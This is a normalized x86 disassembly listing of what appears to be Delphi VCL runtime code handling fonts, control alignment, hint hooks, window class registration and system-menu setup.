call sub_426ff8
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_426ff8
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_4270dc
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_426ff8
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_426ff8
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_426ff8
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_4670f8
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_426e3c
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_426e3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464cac
cmp [ rw-data ] 0x0
je r-xdata
sub_464ce4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_464d44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_464e80 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_464ef4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_46464c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41b654
mov dl [ ebp - 0x1 ]
call sub_464d44
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_464638
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41b4f8
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_41b6d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_41b654
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_464ce4
test al al
je r-xdata
inc esi
sub_465040
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_46464c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_464638
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_465098
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_465040
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_465112
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_464ef4
pop ecx
push ebp
mov al 0x2
call sub_464ef4
pop ecx
push ebp
mov al 0x3
call sub_464ef4
pop ecx
push ebp
mov al 0x4
call sub_464ef4
pop ecx
push ebp
mov al 0x5
call sub_464ef4
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403390
retn
sub_465120
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_464cb4
xor eax eax
push ebp
push sub_465199
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465098
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_464cbc
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4651b4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_404120
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_404174
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_46520c
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_46523d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_467700
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_465260
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_4457fc
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_46777c
sub_4652bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_466804
sub_465300
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_4652bc
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_465260
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_465374
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_4653d0
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_465400
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_465428
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_4653d0
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_465400
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_465400
sub_465468
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_423aa8
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_466be8
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d95c
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_42dd2c
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_467380
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40cac8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_466de0
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40caf0
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408c4c
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404390
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_46755c
mov eax ebx
call sub_467f70
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_465770
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_465651
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
call sub_467f80
mov [ esp + 0x4 ] esi
mov [ esp ] sub_466be8
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_466de0
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_46777c
xor edx edx
mov eax esi
call sub_4670f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423af4
push esi
push sub_465ba4
mov eax esi
call sub_4669d4
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405b50
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403390
mov eax [ esi + 0x90 ]
call sub_403390
mov eax [ esi + 0x98 ]
call sub_403390
test bl bl
jle r-xdata
call sub_424bd0
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_465770
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_465911
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465918
lea eax [ ebp - 0x2c ]
call sub_404120
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_465cf0
call sub_424b38
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_4045e0
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406f80
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_404120
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_4663f4
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_4663f4
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_465920
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_464654
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_465980
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_41b4f8
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_44d7a4
cmp ebx eax
je r-xdata
sub_4659f0
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_465980
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_41b654
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_465b08
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_41b654
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_465ba4
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40cd90
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_464b60
mov eax [ rw-data ]
call sub_4651a8
sub_465bfc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_465c59
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465c60
lea eax [ ebp - 0x4 ]
call sub_404120
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404318
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_465c68
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_465ca4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4663f4
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_465cf0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4663aa
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_465ba4
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_466eb8
jmp r-xdata
cmp eax 0x16
jg r-xdata
